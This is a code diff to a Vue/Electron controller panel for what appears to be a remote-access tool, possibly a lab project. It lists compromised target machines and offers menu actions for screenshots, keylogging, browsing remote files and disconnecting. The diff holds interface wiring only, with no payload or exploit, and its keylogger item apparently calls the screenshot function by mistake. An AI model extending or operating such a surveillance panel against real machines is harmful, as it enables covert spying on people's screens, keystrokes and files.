@@ -1,50 +1,49 @@
 <template>
-  <div>
+  <div
+      @dblclick="refreshList"
+  >
     <el-table
-        :data="tableData"
+        :data="$store.state.targetList"
         border
         stripe
         height="250"
         style="width: 100%"
         :row-class-name="tableRowClassName"
-        @row-contextmenu="rightClick">
+        @row-contextmenu="rightClick"
+        empty-text="双击刷新列表"
+    >
       <el-scrollbar style="height:100%">
         <el-table-column
-            key="1"
-            prop="externel"
-            label="externel"
-            width="200">
-        </el-table-column>
-        <el-table-column
-            key="2"
-            prop="internel"
-            label="internel"
-            width="200">
-        </el-table-column>
-        <el-table-column
-            key="3"
-            prop="listener"
-            label="listener"
+            prop="ip"
+            label="IP"
             width="150">
         </el-table-column>
         <el-table-column
-            key="4"
             prop="user"
-            label="user"
+            label="User"
+            width="100">
+        </el-table-column>
+        <el-table-column
+            prop="port"
+            label="Port"
+            width="77">
+        </el-table-column>
+        <el-table-column
+            prop="system"
+            label="System"
             width="150">
         </el-table-column>
         <el-table-column
-            key="5"
-            prop="process"
-            label="process"
-            width="100">
+            prop="uuid"
+            label="uuid"
+            width="320">
         </el-table-column>
       </el-scrollbar>
     </el-table>
     <div id="targetMenu">
-      <div class="menu" 
-        v-for="(item,index) in menus" 
-        :key="index" 
+      <div class="menu"
+        v-for="(item,index) in menus"
+        :key="index"
         @click.stop="infoClick(index)">{{ item }}</div>
     </div>
   </div>
@@ -53,43 +52,10 @@
 <script>
 import { ipcRenderer } from 'electron'
 
-let tableDATA = [{
-  externel: '123.122.14.156',
-  internel: '192.168.110.130',
-  listener: 'test',
-  user: 'admin',
-  process: 'beacon.exe'
-}, {
-  externel: '123.122.14.156',
-  internel: '192.168.110.130',
-  listener: 'test',
-  user: 'admin',
-  process: 'beacon.exe'
-}, {
-  externel: '123.122.14.156',
-  internel: '192.168.110.130',
-  listener: 'test',
-  user: 'admin',
-  process: 'beacon.exe'
-}, {
-  externel: '123.122.14.156',
-  internel: '192.168.110.130',
-  listener: 'test',
-  user: 'admin',
-  process: 'beacon.exe'
-}, {
-  externel: '123.122.14.156',
-  internel: '192.168.110.130',
-  listener: 'test',
-  user: 'admin',
-  process: 'beacon.exe'
-}]
-
 export default {
   data () {
     return {
       menus: ['刷新列表', '屏幕截图', '键盘记录', '文件目录', '断开连接'],
-      tableData: tableDATA,
       currentRowIndex: 0
     }
   },
@@ -99,29 +65,22 @@ export default {
     },
     // 自定义菜单点击事件
     infoClick (index) {
-      this.$alert('当前table的下标为' + this.currentRowIndex, '你点击了自定义菜单的' + this.menus[index] + '功能', {
-        confirmButtonText: '确定',
-        callback: action => {
-          var targetMenu = document.querySelector('#targetMenu')
-          targetMenu.style.display = 'none'
-        }
-      })
       if (this.menus[index] === '刷新列表') {
+        this.updateTargetList(this.currentRowIndex)
         this.$forceUpdate()
       }
       if (this.menus[index] === '屏幕截图') {
-        this.updateTargetList()
+        this.getScreenShot()
         // todo Screenshot
       }
       if (this.menus[index] === '键盘记录') {
-        this.requestKeylogger()
-
+        this.getScreenShot()
       }
       if (this.menus[index] === '文件目录') {
-        this.getFile('C:\\', 'lmy.txt')
+        this.requestFilePreview()
       }
       if (this.menus[index] === '断开连接') {
-        this.updateKeylogger()
+        this.disconnectTarget()
       }
     },
     /**
@@ -139,11 +98,10 @@ export default {
      * @description: 更新靶机列表
      * @return {json}  targetList 靶机列表
      */
-    updateTargetList () {
+    updateTargetList (index) {
       ipcRenderer.once('updateTargetList', (event, targetList) => {
-        console.log(JSON.stringify(targetList))
-        console.log(targetList[0].uuid)
-        this.changeCurrentTarget(targetList[0].uuid)
+        this.$store.commit('updateTargetList', targetList)
+        this.changeCurrentTarget(targetList[index].uuid)
       })
       ipcRenderer.send('requestTargetList')
     },
@@ -169,7 +127,7 @@ export default {
     },
     /**
      * @description: 请求键盘监控开始
-     * @return {string} stream 
+     * @return {string} stream
      */
     requestKeylogger () {
       ipcRenderer.once('keyloggerStart', (event, stream) => {
@@ -213,7 +171,13 @@ export default {
      */
     getScreenShot () {
       ipcRenderer.once('ScreenShot', (event, url) => {
-        alert('截图保存在' + url)
+        this.$alert('文件保存在：' + url,{
+          confirmButtonText: '确定',
+          callback: action => {
+            let targetMenu = document.querySelector('#targetMenu')
+            targetMenu.style.display = 'none'
+          }
+        })
       })
       ipcRenderer.send('requestScreenShot')
     },
@@ -235,6 +199,13 @@ export default {
     requestFilePreview (rootPath = 'C:\\') {
       ipcRenderer.once('filepreview', (event, filePreview) => {
         alert('Vue:' + filePreview)
+        let tmp = JSON.parse(filePreview)
+        let filePath = tmp['position'].split('\\')
+        console.log(filePath)
+        this.$store.commit('updateCurrentPath', filePath)
+        let fileList = tmp['fileInfo']
+        console.log(fileList)
+        this.$store.commit('updateCurrentFileList', fileList)
       })
       ipcRenderer.send('requestFilePreview', rootPath)
     },
@@ -251,13 +222,17 @@ export default {
     },
     // table的右键点击当前行事件
     rightClick (row, column, event) {
-      var targetMenu = document.querySelector('#targetMenu')
+      let targetMenu = document.querySelector('#targetMenu')
       event.preventDefault()
       targetMenu.style.left = (event.clientX - 200) + 'px'
       targetMenu.style.top = (event.clientY - 60) + 'px'
       targetMenu.style.display = 'block'
       console.log(row, column)
       this.currentRowIndex = row.index
+    },
+    refreshList () {
+      this.updateTargetList(0)
+      this.$forceUpdate()
     }
   }
 }
